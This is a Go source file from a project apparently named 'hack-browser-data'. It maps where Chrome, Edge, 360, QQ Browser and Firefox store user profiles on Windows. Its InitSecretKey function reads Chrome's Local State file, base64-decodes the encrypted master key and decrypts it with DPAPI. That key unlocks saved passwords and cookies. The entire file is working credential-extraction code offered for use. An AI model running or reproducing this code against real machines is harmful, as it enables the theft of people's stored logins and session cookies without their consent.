package core

import (
	"encoding/base64"
	"errors"
	"hack-browser-data/core/decrypt"
	"hack-browser-data/utils"
	"os"

	"github.com/tidwall/gjson"
)

const (
	chromeProfilePath    = "/AppData/Local/Google/Chrome/User Data/*/"
	chromeKeyPath        = "/AppData/Local/Google/Chrome/User Data/Local State"
	edgeProfilePath      = "/AppData/Local/Microsoft/Edge/User Data/*/"
	edgeKeyPath          = "/AppData/Local/Microsoft/Edge/User Data/Local State"
	speed360ProfilePath  = "/AppData/Local/360chrome/Chrome/User Data/*/"
	speed360KeyPath      = ""
	qqBrowserProfilePath = "/AppData/Local/Tencent/QQBrowser/User Data/*/"
	qqBrowserKeyPath     = ""
	firefoxProfilePath   = "/AppData/Roaming/Mozilla/Firefox/Profiles/*.default-release/"
	firefoxKeyPath       = ""
)

var (
	browserList = map[string]struct {
		ProfilePath string
		Name        string
		KeyPath     string
		New         func(profile, key, name string) (Browser, error)
	}{
		"chrome": {
			ProfilePath: os.Getenv("USERPROFILE") + chromeProfilePath,
			KeyPath:     os.Getenv("USERPROFILE") + chromeKeyPath,
			Name:        chromeName,
			New:         NewChromium,
		},
		"edge": {
			ProfilePath: os.Getenv("USERPROFILE") + edgeProfilePath,
			KeyPath:     os.Getenv("USERPROFILE") + edgeKeyPath,
			Name:        edgeName,
			New:         NewChromium,
		},
		"360": {
			ProfilePath: os.Getenv("USERPROFILE") + speed360ProfilePath,
			Name:        speed360Name,
			New:         NewChromium,
		},
		"qq": {
			ProfilePath: os.Getenv("USERPROFILE") + qqBrowserProfilePath,
			Name:        qqBrowserName,
			New:         NewChromium,
		},
		"firefox": {
			ProfilePath: os.Getenv("USERPROFILE") + firefoxProfilePath,
			Name:        firefoxName,
			New:         NewFirefox,
		},
	}
)

var (
	errBase64DecodeFailed = errors.New("decode base64 failed")
)

func (c *Chromium) InitSecretKey() error {
	if c.keyPath == "" {
		return nil
	}
	keyFile, err := utils.ReadFile(c.keyPath)
	if err != nil {
		return err
	}
	encryptedKey := gjson.Get(keyFile, "os_crypt.encrypted_key")
	if encryptedKey.Exists() {
		pureKey, err := base64.StdEncoding.DecodeString(encryptedKey.String())
		if err != nil {
			return errBase64DecodeFailed
		}
		c.secretKey, err = decrypt.DPApi(pureKey[5:])
		return err
	}
	return nil
}
